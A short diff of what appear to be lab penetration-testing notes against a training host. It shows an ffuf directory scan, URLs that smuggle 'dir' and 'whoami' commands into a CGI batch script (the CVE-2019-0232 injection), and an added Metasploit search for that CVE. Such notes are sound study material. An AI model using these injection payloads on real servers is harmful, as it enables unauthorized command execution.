@@ -116,4 +116,6 @@ ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/F
 
 http://10.129.204.227:8080/cgi/welcome.bat?&dir
 http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
+
+msfconsole > search CVE-2019-0232
 ```
